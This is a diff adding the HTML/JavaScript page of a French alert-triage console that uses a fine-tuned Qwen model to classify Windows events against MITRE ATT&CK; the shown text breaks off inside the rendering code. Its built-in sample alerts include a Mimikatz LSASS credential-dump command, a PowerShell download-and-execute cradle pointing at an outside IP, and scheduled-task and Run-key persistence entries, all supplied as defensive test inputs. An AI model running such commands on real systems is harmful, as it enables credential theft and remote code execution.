@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SOC-Qwen-FR — Console de triage d'alertes Windows</title>
+<meta name="description" content="Triage d'alertes Windows en français par un Qwen3-4B fine-tuné : verdict, technique MITRE ATT&CK, tactique, sévérité et recommandations.">
+<!-- active l'isolation cross-origin (multi-thread WebAssembly) sur GitHub Pages -->
+<script src="coi-serviceworker.js"></script>
+<style>
+  :root {
+    --bg:#070b14; --bg2:#0b1120; --panel:#0f172a; --panel2:#131c31; --line:#1e293b; --line2:#2a3650;
+    --text:#e2e8f0; --muted:#8a96ad; --dim:#5b6780;
+    --accent:#38bdf8; --accent2:#818cf8;
+    --crit:#f43f5e; --high:#f97316; --med:#eab308; --low:#22c55e; --info:#64748b; --ok:#10b981;
+    --mono: ui-monospace, "JetBrains Mono", "Cascadia Code", Consolas, monospace;
+  }
+  * { box-sizing:border-box; }
+  html, body { margin:0; background:var(--bg); color:var(--text);
+    font:14px/1.5 Inter, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+  body { background: radial-gradient(1200px 500px at 80% -10%, rgba(56,189,248,.08), transparent 60%),
+                     radial-gradient(900px 400px at -10% 10%, rgba(129,140,248,.07), transparent 60%), var(--bg); min-height:100vh; }
+  a { color:var(--accent); text-decoration:none; } a:hover { text-decoration:underline; }
+  button { font:inherit; cursor:pointer; }
+  .wrap { max-width:1360px; margin:0 auto; padding:0 20px; }
+
+  /* ---------- en-tête ---------- */
+  header { border-bottom:1px solid var(--line); background:rgba(7,11,20,.75); backdrop-filter:blur(8px); position:sticky; top:0; z-index:10; }
+  .hbar { display:flex; align-items:center; gap:16px; height:60px; }
+  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:16px; letter-spacing:.2px; }
+  .logo { width:30px; height:30px; border-radius:8px; display:grid; place-items:center;
+          background:linear-gradient(135deg, var(--accent), var(--accent2)); color:#04121f; font-weight:800; font-size:14px; }
+  .brand small { display:block; font-weight:500; font-size:11.5px; color:var(--muted); letter-spacing:0; }
+  .spacer { flex:1; }
+  .status { display:flex; align-items:center; gap:8px; padding:6px 12px; border:1px solid var(--line2); border-radius:999px; font-size:12.5px; color:var(--muted); }
+  .dot { width:8px; height:8px; border-radius:50%; background:var(--dim); box-shadow:0 0 0 3px rgba(91,103,128,.15); }
+  .dot.ready { background:var(--ok); box-shadow:0 0 0 3px rgba(16,185,129,.18); }
+  .dot.busy { background:var(--med); box-shadow:0 0 0 3px rgba(234,179,8,.18); animation:pulse 1.2s infinite; }
+  .dot.err { background:var(--crit); }
+  @keyframes pulse { 50% { opacity:.4; } }
+  .hlinks { display:flex; gap:14px; font-size:13px; }
+  .hlinks a { color:var(--muted); } .hlinks a:hover { color:var(--text); text-decoration:none; }
+
+  /* ---------- grille ---------- */
+  .kpis { display:grid; grid-template-columns:repeat(5, 1fr); gap:12px; margin:20px 0 16px; }
+  .kpi { background:var(--panel); border:1px solid var(--line); border-radius:12px; padding:14px 16px; }
+  .kpi .l { color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.08em; }
+  .kpi .v { font-size:24px; font-weight:700; margin-top:2px; font-variant-numeric:tabular-nums; }
+  .kpi .s { font-size:12px; color:var(--dim); }
+  .grid { display:grid; grid-template-columns: 340px 1fr 1.1fr; gap:16px; align-items:start; }
+  @media (max-width:1180px) { .grid { grid-template-columns:1fr 1fr; } .grid > .engine { grid-column:1 / -1; } .kpis { grid-template-columns:repeat(3,1fr);} }
+  @media (max-width:760px) { .grid { grid-template-columns:1fr; } .kpis { grid-template-columns:repeat(2,1fr);} .hlinks { display:none; } }
+  .card { background:var(--panel); border:1px solid var(--line); border-radius:14px; }
+  .card > .hd { display:flex; align-items:center; gap:10px; padding:14px 16px; border-bottom:1px solid var(--line); }
+  .card > .hd h2 { margin:0; font-size:13px; font-weight:600; text-transform:uppercase; letter-spacing:.08em; color:#cbd5e1; }
+  .card > .bd { padding:16px; }
+  .muted { color:var(--muted); } .small { font-size:12.5px; }
+
+  /* ---------- moteur ---------- */
+  .seg { display:grid; grid-template-columns:1fr 1fr; background:var(--bg2); border:1px solid var(--line); border-radius:10px; padding:3px; margin-bottom:14px; }
+  .seg button { background:transparent; border:0; color:var(--muted); padding:8px; border-radius:8px; font-size:13px; font-weight:600; }
+  .seg button.on { background:var(--panel2); color:var(--text); box-shadow:0 1px 0 rgba(255,255,255,.04) inset, 0 0 0 1px var(--line2); }
+  .mode { display:none; } .mode.on { display:block; }
+  .btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; border:1px solid var(--line2); background:var(--panel2); color:var(--text);
+         padding:9px 14px; border-radius:9px; font-weight:600; font-size:13px; }
+  .btn:hover { border-color:#3b4a68; }
+  .btn.primary { background:linear-gradient(135deg, #0ea5e9, #6366f1); border-color:transparent; color:white; }
+  .btn.primary:hover { filter:brightness(1.08); }
+  .btn:disabled { opacity:.5; cursor:not-allowed; filter:none; }
+  .btn.block { width:100%; }
+  .bar { height:8px; background:var(--bg2); border-radius:99px; overflow:hidden; border:1px solid var(--line); margin:10px 0 6px; }
+  .bar > i { display:block; height:100%; width:0; background:linear-gradient(90deg, var(--accent), var(--accent2)); transition:width .2s; }
+  input[type=text] { width:100%; background:var(--bg2); color:var(--text); border:1px solid var(--line2); border-radius:9px; padding:9px 11px; font:13px var(--mono); }
+  input[type=text]:focus, textarea:focus { outline:none; border-color:var(--accent); box-shadow:0 0 0 3px rgba(56,189,248,.15); }
+  .note { font-size:12.5px; color:var(--muted); background:var(--bg2); border:1px solid var(--line); border-radius:10px; padding:10px 12px; margin-top:12px; }
+  .note b { color:#cbd5e1; }
+  .feat { list-style:none; padding:0; margin:12px 0 0; font-size:12.5px; color:var(--muted); }
+  .feat li { padding:3px 0 3px 18px; position:relative; } .feat li::before { content:"›"; position:absolute; left:4px; color:var(--accent); }
+  .tag { display:inline-block; font-size:11px; padding:2px 7px; border-radius:6px; background:var(--bg2); border:1px solid var(--line2); color:var(--muted); font-family:var(--mono); }
+
+  /* ---------- saisie ---------- */
+  textarea { width:100%; min-height:300px; resize:vertical; background:#060a13; color:#d6e2f5; border:1px solid var(--line2); border-radius:10px;
+             padding:12px 14px; font:12.5px/1.55 var(--mono); tab-size:2; }
+  .chips { display:flex; flex-wrap:wrap; gap:6px; margin:12px 0 14px; }
+  .chip { background:var(--bg2); border:1px solid var(--line2); color:#cbd5e1; padding:5px 10px; border-radius:999px; font-size:12px; }
+  .chip:hover { border-color:var(--accent); color:white; }
+  .row { display:flex; gap:8px; align-items:center; }
+  .err { color:#fda4af; font-size:12.5px; margin-top:8px; min-height:18px; }
+
+  /* ---------- résultat ---------- */
+  .empty { text-align:center; padding:60px 20px; color:var(--dim); }
+  .empty svg { opacity:.5; margin-bottom:10px; }
+  .verdict { display:flex; align-items:center; gap:14px; padding:14px 16px; border-radius:12px; border:1px solid; margin-bottom:14px; }
+  .verdict.sus { background:rgba(244,63,94,.08); border-color:rgba(244,63,94,.35); }
+  .verdict.ben { background:rgba(16,185,129,.08); border-color:rgba(16,185,129,.35); }
+  .vicon { width:42px; height:42px; border-radius:10px; display:grid; place-items:center; font-weight:800; font-size:20px; }
+  .sus .vicon { background:rgba(244,63,94,.18); color:var(--crit); } .ben .vicon { background:rgba(16,185,129,.18); color:var(--ok); }
+  .vtxt b { font-size:17px; letter-spacing:.06em; } .vtxt div { color:var(--muted); font-size:12.5px; }
+  .sev { margin-left:auto; text-align:right; }
+  .sev .meter { display:flex; gap:3px; margin-top:4px; justify-content:flex-end; }
+  .sev .meter i { width:14px; height:6px; border-radius:2px; background:var(--line2); }
+  .tech { display:grid; grid-template-columns:1fr auto; gap:6px 12px; padding:14px 16px; background:var(--bg2); border:1px solid var(--line); border-radius:12px; margin-bottom:14px; }
+  .tech .id { font:700 13px var(--mono); color:var(--accent); background:rgba(56,189,248,.1); border:1px solid rgba(56,189,248,.3); padding:3px 8px; border-radius:7px; display:inline-block; }
+  .tech .name { font-weight:600; font-size:15px; margin-top:6px; }
+  .tech .lbl { font-size:11.5px; color:var(--muted); text-transform:uppercase; letter-spacing:.08em; }
+  .chain { display:grid; grid-template-columns:repeat(15, 1fr); gap:3px; margin:4px 0 16px; }
+  .chain div { height:30px; border-radius:5px; background:var(--bg2); border:1px solid var(--line); position:relative; }
+  .chain div.on { background:linear-gradient(180deg, rgba(244,63,94,.55), rgba(244,63,94,.25)); border-color:var(--crit); box-shadow:0 0 12px rgba(244,63,94,.35); }
+  .chain div:hover::after { content:attr(data-t); position:absolute; bottom:36px; left:50%; transform:translateX(-50%); white-space:nowrap;
+        background:#020617; border:1px solid var(--line2); padding:4px 8px; border-radius:6px; font-size:11.5px; z-index:5; }
+  .chainlbl { display:flex; justify-content:space-between; font-size:10.5px; color:var(--dim); text-transform:uppercase; letter-spacing:.06em; }
+  h3 { font-size:12px; text-transform:uppercase; letter-spacing:.08em; color:var(--muted); margin:16px 0 8px; font-weight:600; }
+  .expl { line-height:1.6; color:#d3dceb; }
+  .recos { list-style:none; margin:0; padding:0; }
+  .recos li { display:flex; gap:10px; align-items:flex-start; padding:8px 10px; border:1px solid var(--line); border-radius:9px; margin-bottom:6px; background:var(--bg2); }
+  .recos input { margin-top:3px; accent-color:var(--ok); }
+  details { margin-top:14px; } summary { cursor:pointer; color:var(--muted); font-size:12.5px; }
+  pre { background:#060a13; border:1px solid var(--line); border-radius:10px; padding:12px; font:12px/1.5 var(--mono); overflow:auto; max-height:260px; }
+  .meta { display:flex; gap:12px; flex-wrap:wrap; font-size:12px; color:var(--dim); margin-top:12px; }
+  .stream { font:12px/1.5 var(--mono); color:var(--muted); white-space:pre-wrap; max-height:220px; overflow:auto; background:#060a13; border:1px dashed var(--line2); border-radius:10px; padding:12px; }
+
+  /* ---------- historique & stats ---------- */
+  .lower { display:grid; grid-template-columns: 2fr 1fr; gap:16px; margin:16px 0 30px; }
+  @media (max-width:1000px) { .lower { grid-template-columns:1fr; } }
+  table { width:100%; border-collapse:collapse; font-size:13px; }
+  th { text-align:left; font-weight:600; color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.06em; padding:8px 10px; border-bottom:1px solid var(--line); }
+  td { padding:9px 10px; border-bottom:1px solid var(--line); vertical-align:middle; }
+  tr.clk { cursor:pointer; } tr.clk:hover td { background:rgba(56,189,248,.04); }
+  .pill { display:inline-block; padding:2px 8px; border-radius:99px; font-size:11.5px; font-weight:600; }
+  .pill.sus { background:rgba(244,63,94,.14); color:#fb7185; } .pill.ben { background:rgba(16,185,129,.14); color:#34d399; }
+  .sv { display:inline-flex; align-items:center; gap:6px; } .sv i { width:8px; height:8px; border-radius:50%; display:inline-block; }
+  .hbars .r { display:grid; grid-template-columns: 150px 1fr 28px; gap:8px; align-items:center; font-size:12.5px; margin:7px 0; }
+  .hbars .t { height:10px; background:var(--bg2); border-radius:99px; overflow:hidden; border:1px solid var(--line); }
+  .hbars .t i { display:block; height:100%; background:linear-gradient(90deg, var(--accent2), var(--crit)); }
+  .hbars .n { text-align:right; color:var(--muted); font-variant-numeric:tabular-nums; }
+  .mtab td:first-child { color:var(--muted); } .mtab td { padding:7px 6px; } .mtab b { color:#a7f3d0; }
+  footer { border-top:1px solid var(--line); color:var(--dim); font-size:12px; padding:18px 0 28px; }
+  .toast { position:fixed; bottom:20px; right:20px; background:#020617; border:1px solid var(--line2); padding:10px 14px; border-radius:10px; font-size:13px; opacity:0; transform:translateY(8px); transition:.2s; z-index:50; }
+  .toast.on { opacity:1; transform:none; }
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap hbar">
+    <div class="brand"><div class="logo">SQ</div><div>SOC-Qwen-FR<small>Console de triage d'alertes Windows · MITRE ATT&amp;CK</small></div></div>
+    <div class="spacer"></div>
+    <div class="status"><span class="dot" id="sdot"></span><span id="stxt">Aucun moteur connecté</span></div>
+    <nav class="hlinks">
+      <a href="https://github.com/azddine123/soc-qwen-fr" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://huggingface.co/AZAS123/soc-qwen3-4b-fr-lora" target="_blank" rel="noopener">Modèle</a>
+      <a href="https://huggingface.co/datasets/AZAS123/soc-triage-fr" target="_blank" rel="noopener">Dataset</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+  <section class="kpis">
+    <div class="kpi"><div class="l">Alertes analysées</div><div class="v" id="k-total">0</div><div class="s">dans cette console</div></div>
+    <div class="kpi"><div class="l">Suspectes</div><div class="v" id="k-sus" style="color:#fb7185">0</div><div class="s" id="k-susp">—</div></div>
+    <div class="kpi"><div class="l">Critiques / élevées</div><div class="v" id="k-high" style="color:var(--high)">0</div><div class="s">à traiter en priorité</div></div>
+    <div class="kpi"><div class="l">Techniques distinctes</div><div class="v" id="k-tech">0</div><div class="s">MITRE ATT&amp;CK</div></div>
+    <div class="kpi"><div class="l">Temps moyen</div><div class="v" id="k-time">—</div><div class="s">par analyse</div></div>
+  </section>
+
+  <div class="grid">
+    <!-- moteur -->
+    <section class="card engine">
+      <div class="hd"><h2>Moteur d'inférence</h2></div>
+      <div class="bd">
+        <div class="seg">
+          <button id="m-browser" class="on">Navigateur</button>
+          <button id="m-colab">Serveur Colab</button>
+        </div>
+        <div class="mode on" id="p-browser">
+          <div class="small muted">Le modèle (Qwen3-4B fine-tuné, GGUF Q4_K_M, ~2,5 Go) s'exécute <b style="color:#cbd5e1">entièrement dans votre navigateur</b> : aucune donnée ne quitte votre poste.</div>
+          <div class="bar"><i id="dl-bar"></i></div>
+          <div class="small muted" id="dl-txt">Non chargé</div>
+          <button class="btn primary block" id="btn-load" style="margin-top:10px">Charger le modèle</button>
+          <ul class="feat">
+            <li>Téléchargé une seule fois, puis mis en cache</li>
+            <li id="gpu-info">Détection de WebGPU…</li>
+            <li>Compter 1 à 3 min par analyse sur CPU</li>
+          </ul>
+        </div>
+        <div class="mode" id="p-colab">
+          <div class="small muted">Rapide (GPU T4). Lancez la démo Colab, puis collez l'adresse <span class="tag">https://….gradio.live</span> affichée en bas du notebook.</div>
+          <a class="btn block" style="margin:12px 0 10px" target="_blank" rel="noopener" href="https://colab.research.google.com/github/azddine123/soc-qwen-fr/blob/main/notebooks/demo_colab.ipynb">1. Ouvrir la démo Colab ↗</a>
+          <input type="text" id="colab-url" placeholder="https://xxxxxxxx.gradio.live">
+          <button class="btn primary block" id="btn-colab" style="margin-top:10px">2. Connecter</button>
+          <div class="note"><b>Astuce :</b> dans Colab, choisissez <i>Exécution → Tout exécuter</i> avec un GPU T4. Le lien reste valable tant que la session est ouverte.</div>
+        </div>
+        <div class="err" id="eng-err"></div>
+        <h3>Performances (test, 123 logs réels)</h3>
+        <table class="mtab small">
+          <tr><td>JSON exploitable</td><td>33 % → <b>94 %</b></td></tr>
+          <tr><td>Verdict correct</td><td>86 % → <b>100 %</b></td></tr>
+          <tr><td>Technique exacte</td><td>18 % → <b>24 %</b></td></tr>
+          <tr><td>Technique parente</td><td>21 % → <b>33 %</b></td></tr>
+          <tr><td>Tactique (ID TA)</td><td>0 % → <b>36 %</b></td></tr>
+        </table>
+        <div class="small muted" style="margin-top:6px">Qwen3-4B de base → SOC-Qwen-FR. La technique proposée doit être vérifiée par l'analyste.</div>
+      </div>
+    </section>
+
+    <!-- saisie -->
+    <section class="card">
+      <div class="hd"><h2>Événement</h2><div class="spacer"></div>
+        <label class="btn" style="padding:6px 10px">Importer .json<input type="file" id="file" accept=".json,.txt" hidden></label></div>
+      <div class="bd">
+        <textarea id="event" spellcheck="false" placeholder='{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "Image": "...", "CommandLine": "..."}'></textarea>
+        <div class="chips" id="chips"></div>
+        <div class="row">
+          <button class="btn primary" id="btn-run" style="flex:1" disabled>Analyser l'événement</button>
+          <button class="btn" id="btn-fmt" title="Formater le JSON">{ }</button>
+          <button class="btn" id="btn-clear" title="Effacer">✕</button>
+        </div>
+        <div class="err" id="run-err"></div>
+      </div>
+    </section>
+
+    <!-- résultat -->
+    <section class="card">
+      <div class="hd"><h2>Triage</h2><div class="spacer"></div>
+        <button class="btn" id="btn-copy" style="padding:6px 10px" disabled>Copier le JSON</button></div>
+      <div class="bd" id="result">
+        <div class="empty">
+          <svg width="46" height="46" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 3l8 3v6c0 4.5-3.4 8.3-8 9-4.6-.7-8-4.5-8-9V6l8-3z"/><path d="M9 12l2 2 4-4"/></svg>
+          <div>Chargez un moteur, collez un événement Windows puis lancez l'analyse.</div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <div class="lower">
+    <section class="card">
+      <div class="hd"><h2>Historique</h2><div class="spacer"></div>
+        <button class="btn" id="btn-csv" style="padding:6px 10px">Export CSV</button>
+        <button class="btn" id="btn-json" style="padding:6px 10px">Export JSON</button>
+        <button class="btn" id="btn-reset" style="padding:6px 10px">Vider</button></div>
+      <div class="bd" style="padding:0 0 6px; overflow:auto">
+        <table>
+          <thead><tr><th>Heure</th><th>Hôte</th><th>Verdict</th><th>Technique</th><th>Tactique</th><th>Sévérité</th></tr></thead>
+          <tbody id="hist"><tr><td colspan="6" class="muted" style="text-align:center; padding:24px">Aucune analyse pour le moment</td></tr></tbody>
+        </table>
+      </div>
+    </section>
+    <section class="card">
+      <div class="hd"><h2>Répartition par tactique</h2></div>
+      <div class="bd hbars" id="tacbars"><div class="muted small">Les tactiques détectées apparaîtront ici.</div></div>
+    </section>
+  </div>
+</main>
+
+<footer><div class="wrap">SOC-Qwen-FR — Qwen3-4B-Instruct fine-tuné (QLoRA) sur des règles SigmaHQ (DRL 1.1) et MITRE ATT&amp;CK v19. Outil d'aide à l'analyste, usage défensif uniquement.
+  Moteur navigateur : <a href="https://github.com/ngxson/wllama" target="_blank" rel="noopener">wllama</a> (llama.cpp WebAssembly). Réalisé par Azddine EL HAMDAOUI.</div></footer>
+<div class="toast" id="toast"></div>
+
+<script type="module">
+const MODEL_REPO = "AZAS123/soc-qwen3-4b-fr-GGUF";
+const SYSTEM_PROMPT = "Tu es un analyste SOC expert en détection sur Windows. Analyse l'événement fourni et réponds UNIQUEMENT avec un objet JSON contenant : verdict (\"suspect\" ou \"bénin\"), technique_id, technique, tactique, severite, explication (en français) et recommandations (liste, en français).";
+const TACTICS = [
+  ["TA0043","Reconnaissance"],["TA0042","Dév. de ressources"],["TA0001","Accès initial"],["TA0002","Exécution"],
+  ["TA0003","Persistance"],["TA0004","Élévation de privilèges"],["TA0005","Furtivité"],["TA0112","Affaiblissement des défenses"],
+  ["TA0006","Accès aux identifiants"],["TA0007","Découverte"],["TA0008","Mouvement latéral"],["TA0009","Collecte"],
+  ["TA0011","Commande et contrôle"],["TA0010","Exfiltration"],["TA0040","Impact"]];
+const SEV = { "informative":[1,"var(--info)"], "faible":[2,"var(--low)"], "moyenne":[3,"var(--med)"], "élevée":[4,"var(--high)"], "elevee":[4,"var(--high)"], "critique":[5,"var(--crit)"] };
+const EXAMPLES = [
+  ["Mimikatz", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":1,"Computer":"WS-014.corp.local","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"\"cmd.exe\" /c C:\\Tools\\x64\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit","User":"CORP\\j.dupont","IntegrityLevel":"High","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}],
+  ["Tâche planifiée", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":1,"Computer":"WS-031.corp.local","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Updater /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM","User":"CORP\\j.dupont","ParentImage":"C:\\Windows\\System32\\cmd.exe"}],
+  ["Téléchargement PowerShell", {"Channel":"Microsoft-Windows-PowerShell/Operational","EventID":4104,"Computer":"WS-007.corp.local","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://185.12.45.9/a.ps1')"}],
+  ["Clé Run (registre)", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":13,"Computer":"WS-022.corp.local","EventType":"SetValue","Image":"C:\\Users\\k.amrani\\AppData\\Local\\Temp\\svc.exe","TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","Details":"C:\\Users\\k.amrani\\AppData\\Local\\Temp\\svc.exe"}],
+  ["Requête DNS légitime", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":22,"Computer":"WS-026.corp.local","Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","QueryName":"www.ensabm.ac.ma"}],
+];
+
+const $ = (id) => document.getElementById(id);
+const esc = (s) => String(s ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const toast = (m) => { const t = $("toast"); t.textContent = m; t.classList.add("on"); setTimeout(() => t.classList.remove("on"), 2200); };
+const store = { get(k, d) { try { return JSON.parse(localStorage.getItem(k)) ?? d; } catch { return d; } },
+                set(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} } };
+
+let engine = null;          // { name, run(text, onToken) }
+let history = store.get("socqwen.history", []);
+let current = null;
+
+function setStatus(state, text) { $("sdot").className = "dot " + state; $("stxt").textContent = text; }
+function setEngine(e) { engine = e; $("btn-run").disabled = !e; setStatus(e ? "ready" : "", e ? e.name + " prêt" : "Aucun moteur connecté"); }
+
+/* ---------- modes ---------- */
+for (const [b, p] of [["m-browser","p-browser"],["m-colab","p-colab"]]) {
+  $(b).onclick = () => { document.querySelectorAll(".seg button").forEach(x => x.classList.remove("on"));
+    document.querySelectorAll(".mode").forEach(x => x.classList.remove("on")); $(b).classList.add("on"); $(p).classList.add("on"); };
+}
+$("gpu-info").textContent = navigator.gpu ? "WebGPU détecté : accélération GPU possible" : "WebGPU indisponible : exécution sur CPU";
+const savedUrl = store.get("socqwen.colab", ""); if (savedUrl) $("colab-url").value = savedUrl;
+
+/* ---------- moteur navigateur (wllama) ---------- */
+let wllama = null;
+$("btn-load").onclick = async () => {
+  $("eng-err").textContent = ""; $("btn-load").disabled = true; setStatus("busy", "Chargement du modèle…");
+  try {
+    const meta = await (await fetch(`https://huggingface.co/api/models/${MODEL_REPO}`)).json();
+    const files = (meta.siblings || []).map(s => s.rfilename);
+    const first = files.find(f => /-00001-of-\d+\.gguf$/.test(f));
+    if (!first) throw new Error("La version découpée du modèle pour le navigateur n'est pas encore publiée. Utilisez le serveur Colab.");
+    const { Wllama, LoggerWithoutDebug } = await import("./vendor/wllama/index.js");
+    wllama = new Wllama({ default: new URL("./vendor/wllama/wllama.wasm", location.href).href },
+                        { parallelDownloads: 4, logger: LoggerWithoutDebug });
+    await wllama.loadModelFromHF({ repo: MODEL_REPO, file: first }, {
+      n_ctx: 2048, n_batch: 512,
+      progressCallback: ({ loaded, total }) => {
+        const p = total ? loaded / total : 0;
+        $("dl-bar").style.width = (p * 100).toFixed(1) + "%";
+        $("dl-txt").textContent = `Téléchargement : ${(loaded / 1e9).toFixed(2)} / ${(total / 1e9).toFixed(2)} Go`;
+      } });
+    $("dl-bar").style.width = "100%";
+    const mt = wllama.isMultithread ? (wllama.isMultithread() ? "multi-thread" : "mono-thread") : "";
+    $("dl-txt").textContent = `Modèle chargé ${mt ? "(" + mt + ")" : ""}`;
+    setEngine({ name: "Navigateur", run: async (text, onTok) => {
+      const stream = await wllama.createChatCompletion({ messages: buildMessages(text), max_tokens: 512, temperature: 0, stream: true });
+      let out = ""; for await (const ch of stream) { const d = ch.choices?.[0]?.delta?.content || ""; out += d; onTok(out); }
+      return out; } });
+    $("btn-load").textContent = "Modèle chargé ✓";
+  } catch (e) {
+    console.error(e); $("eng-err").textContent = e.message || String(e); $("btn-load").disabled = false; setStatus("err", "Échec du chargement");
+  }
+};
+
+/* ---------- moteur Colab (Gradio) ---------- */
+$("btn-colab").onclick = async () => {
+  const url = $("colab-url").value.trim().replace(/\/+$/, "");
+  $("eng-err").textContent = "";
+  if (!/^https:\/\/[\w.-]+\.gradio\.live$/.test(url) && !/^https:\/\//.test(url)) { $("eng-err").textContent = "Adresse invalide (attendu : https://….gradio.live)"; return; }
+  setStatus("busy", "Connexion au serveur Colab…"); $("btn-colab").disabled = true;
+  try {
+    const { Client } = await import("https://esm.sh/@gradio/client@2.8.0");
+    const client = await Client.connect(url);
+    store.set("socqwen.colab", url);
+    setEngine({ name: "Serveur Colab", run: async (text) => {
+      let r; try { r = await client.predict("/triage", { event_text: text }); }
+      catch (e) { r = await client.predict("/triage", [text]); }
+      return Array.isArray(r.data) ? r.data[0] : r.data; } });
+  } catch (e) {
+    console.error(e); $("eng-err").textContent = "Connexion impossible : la session Colab est-elle lancée ? (" + (e.message || e) + ")"; setStatus("err", "Serveur injoignable");
+  } finally { $("btn-colab").disabled = false; }
+};
+
+/* ---------- saisie ---------- */
+for (const [label, ev] of EXAMPLES) {
+  const b = document.createElement("button"); b.className = "chip"; b.textContent = label;
+  b.onclick = () => { $("event").value = JSON.stringify(ev, null, 2); $("run-err").textContent = ""; }; $("chips").appendChild(b);
+}
+$("btn-fmt").onclick = () => { try { $("event").value = JSON.stringify(JSON.parse($("event").value), null, 2); } catch { $("run-err").textContent = "JSON invalide"; } };
+$("btn-clear").onclick = () => { $("event").value = ""; $("run-err").textContent = ""; };
+$("file").onchange = async (e) => { const f = e.target.files[0]; if (f) $("event").value = await f.text(); e.target.value = ""; };
+
+function buildMessages(text) {
+  let t = text.trim(); try { t = JSON.stringify(JSON.parse(t)); } catch {}
+  return [{ role: "system", content: SYSTEM_PROMPT },
+          { role: "user", content: "Analyse cet événement Windows :\n```json\n" + t.slice(0, 6000) + "\n```" }];
+}
+function parseTriage(raw) {
+  if (raw && typeof raw === "object") return raw;
+  const s = String(raw || "").replace(/<think>[\s\S]*?<\/think>/g, "");
+  try { return JSON.parse(s.slice(s.indexOf("{"), s.lastIndexOf("}") + 1)); } catch { return { brut: s }; }
+}
+
+$("btn-run").onclick = async () => {
+  const text = $("event").value.trim();
+  $("run-err").textContent = "";
+  if (!text) { $("run-err").textContent = "Collez d'abord un événement."; return; }
+  let host = ""; try { const o = JSON.parse(text); host = o.Computer || o.Hostname || ""; } catch {}
+  $("btn-run").disabled = true; $("btn-run").textContent = "Analyse en cours…"; setStatus("busy", "Analyse en cours…");
+  $("result").innerHTML = `<div class="small muted" style="margin-bottom:8px">Génération par le modèle…</div><div class="stream" id="stream">…</div>`;
+  const t0 = performance.now();
+  try {
+    const raw = await engine.run(text, (partial) => { const el = $("stream"); if (el) { el.textContent = partial; el.scrollTop = el.scrollHeight; } });
+    const tri = parseTriage(raw); const secs = (performance.now() - t0) / 1000;
+    current = { ts: new Date().toISOString(), host, engine: engine.name, secs, event: text, triage: tri };
+    if (!tri.brut) { history.unshift(current); history = history.slice(0, 200); store.set("socqwen.history", history); }
+    render(current); refresh();
+  } catch (e) {
+    console.error(e); $("result").innerHTML = `<p class="err">Erreur pendant l'analyse : ${esc(e.message || e)}</p>`;
+  } finally { $("btn-run").disabled = false; $("btn-run").textContent = "Analyser l'événement"; setStatus("ready", engine.name + " prêt"); }
+};
+
+/* ---------- rendu ---------- */
+function attackUrl(id) { return "https://attack.mitre.org/techniques/" + String(id).replace(".", "/") + "/"; }
+function sevInfo(s) { return SEV[String(s || "").toLowerCase()] || [0, "var(--info)"]; }
+function render(rec) {
+  const t = rec.triage; $("btn-copy").disabled = false;
+  if (t.brut !== undefined) { $("result").innerHTML = `<p class="err">Réponse non structurée :</p><pre>${esc(t.brut)}</pre>`; return; }
+  const benin = String(t.verdict || "").toLowerCase().startsWith("b");
+  const [lvl, col] = sevInfo(t.severite);
+  const ta = (String(t.tactique || "").match(/TA\d{4}/) || [""])[0];
+  let h = `<div class="verdict ${benin ? "ben" : "sus"}"><div class="vicon">${benin ? "✓" : "!"}</div>
+    <div class="vtxt"><b>${benin ? "BÉNIN" : "SUSPECT"}</b><div>${esc(rec.host || "Hôte inconnu")} · ${new Date(rec.ts).toLocaleString("fr-FR")}</div></div>
+    <div class="sev"><div class="small muted">Sévérité</div><b style="color:${col}">${esc(t.severite || "—")}</b>
+    <div class="meter">${[1,2,3,4,5].map(i => `<i style="${i <= lvl ? "background:" + col : ""}"></i>`).join("")}</div></div></div>`;
+  if (!benin) {
+    h += `<div class="tech"><div><div class="lbl">Technique MITRE ATT&amp;CK</div>
+      ${t.technique_id ? `<a class="id" href="${attackUrl(t.technique_id)}" target="_blank" rel="noopener">${esc(t.technique_id)} ↗</a>` : ""}
+      <div class="name">${esc(t.technique || "—")}</div></div>
+      <div style="text-align:right"><div class="lbl">Tactique</div><div style="margin-top:6px; font-weight:600">${esc(t.tactique || "—")}</div></div></div>
+      <div class="chainlbl"><span>Reconnaissance</span><span>Chaîne d'attaque</span><span>Impact</span></div>
+      <div class="chain">${TACTICS.map(([id, n]) => `<div class="${id === ta ? "on" : ""}" data-t="${id} · ${n}"></div>`).join("")}</div>`;
+  }
+  h += `<h3>Analyse</h3><div class="expl">${esc(t.explication || "")}</div>`;
+  if (Array.isArray(t.recommandations) && t.recommandations.length)
+    h += `<h3>Actions recommandées</h3><ul class="recos">${t.recommandations.map(r => `<li><input type="checkbox"><span>${esc(r)}</span></li>`).join("")}</ul>`;
+  h += `<div class="meta"><span>Moteur : ${esc(rec.engine)}</span><span>Durée : ${rec.secs.toFixed(1)} s</span></div>
+    <details><summary>Réponse JSON brute</summary><pre>${esc(JSON.stringify(t, null, 2))}</pre></details>`;
